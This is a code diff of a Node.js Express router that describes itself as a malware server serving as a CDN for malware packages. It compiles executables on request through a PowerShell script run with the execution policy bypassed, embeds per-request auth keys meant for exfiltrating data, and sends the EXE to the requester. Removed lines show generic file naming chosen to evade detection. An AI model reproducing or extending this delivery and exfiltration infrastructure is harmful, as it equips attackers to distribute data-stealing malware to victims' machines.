@@ -7,7 +7,7 @@ const path = require("path");
 const logging = require("./logging.js");
 
 // Server IP we are hosting malware server on
-const IP = "127.0.0.1:80";
+const IP = "http://localhost";
 
 // This router will handle the GET requests that ask to retrieve a specified malware.
 // The routing is very simple here since GET requests simply act as a CDN for our malware packages
@@ -36,50 +36,34 @@ getReqRouter.get("*", (request, response, next) => {
 // If default URL + authenticated, send appropriate EXE file
 getReqRouter.get("/", (request, response, next) => {
 
-    // We're going to compile all the C files with the same name to make it harder to detect what our malware does
-    const exeName = "RemoteCode.exe";
-
     // We're using the JSON in EXE_DATA to prevent external machines from trying to run a file inclusion attack
     let reqEXEData = EXE_DATA[request.headers.exe];
 
     if (EXE_DATA[request.headers.exe])
     {
-        // First, let's handle the paths. Here we store the path of the EXE file so we can reference it later. It should be in the same directory under $exeName
-        var cDir = path.dirname(reqEXEData.cPath);          // 🤣 not to be confused with CDIR
-        let exePath = path.resolve(cDir, `./${exeName}`);
-
-        // We're also going to import the "Justin" library and bring in common.c
-        let libraryPath = path.resolve(__dirname, "./Executables/common.c");
-        
-        // We're also going to import the POST request library
-        let postLibraryPath = path.resolve(__dirname, "./Executables/post.c");
+        // The gist is: the compiling script has already been made for you in ./make.ps1
+        // All we gotta do now is spawn a system process to run it.
+        // @see `./exe_datas.js`
 
         // Compiling might throw errors - here's where we catch that.
         try
         {
-            if (reqEXEData.usesAuthKey)
-            {
-                var authKey = genAsciiStr(512);
-                
-                // Make sure to register the actual AuthKey
-                Auth.postKeys.setWithHash(authKey, new Auth.Keys(authKey, request.ip, reqEXEData.singleUse, request.headers.exe));
+            // We'll pass in the $SVL_AUTHKEY and $SVL_ADDRESS into both powershell files. It's up to our .ps1 script to decide what to do with them
+            var authKey = genAsciiStr(512);
+            
+            // Make sure to register the actual AuthKey
+            Auth.postKeys.setWithHash(authKey, new Auth.Keys(authKey, request.ip, reqEXEData.singleUse, request.headers.exe));
 
-                // Now, compile the GCC with a newly generated POST Authkey (if necessary) that will be used to when exfiltrating data
-                // Spawning subprocesses is always very dangerous, but we mitigate this by not spawning a shell and basically having prepared statements
-                // See auth.js for more about how the Authentication is designed
+            // Now, compile the GCC with a newly generated POST Authkey (if necessary) that will be used to when exfiltrating data
+            // Spawning subprocesses is always very dangerous, but we mitigate this by not spawning a shell and basically having prepared statements
+            // See auth.js for more about how the Authentication is designed
 
-                // TO DO: DEPRECATED. FIX THIS CODE.
-                execFileSync(
-                    "gcc", [
-                        reqEXEData.cPath, libraryPath, postLibraryPath, `-o`, exePath, `-lcurl`, `-L`, `/Program Files/curl-8.6.0_1-win32-mingw/lib`, 
-                        `-I`, `/Program Files/curl-8.6.0_1-win32-mingw/include/`, `-D SVL_AUTHKEY=\"${authKey}\"`, `-D SVL_ADDRESS=\"${IP}\"`
-                    ]);
-            }
-            else
-            {
-                // We do not need the postLibraryPath if we're not exfiltrating data
-                execFileSync("gcc", [reqEXEData.cPath, libraryPath, `-o`, exePath])
-            }
+            execFileSync("powershell.exe", [
+                `-ExecutionPolicy`, `Bypass`, 
+                `-File`, `${path.resolve(this.cDir, "./make.ps1")}`, 
+                `-SVL_ADDRESS`, `${IP}`,
+                `-SVL_AUTHKEY`, `${authKey}`
+            ]);
 
             logging.log(`C file ${reqEXEData.cPath} from ${request.ip} compiled!`);
         }
@@ -92,17 +76,17 @@ getReqRouter.get("/", (request, response, next) => {
         }
 
         // Send the EXE file
-        response.sendFile(exePath, (err) => {
+        response.sendFile(reqEXEData.cPath, (err) => {
             if (err)
             {
-                logging.error(`🔨 Error in sending file ${exePath} to ${request.ip}: ${err}`);
+                logging.error(`🔨 Error in sending file ${reqEXEData.cPath} to ${request.ip}: ${err}`);
                 response.status(500);
                 next();
                 return;
             }
             else
             {
-                logging.log(`🔨 EXE file ${exePath} sent to ${request.ip}.`);
+                logging.log(`🔨 EXE file ${reqEXEData.cPath} sent to ${request.ip}.`);
             }
         });
     }
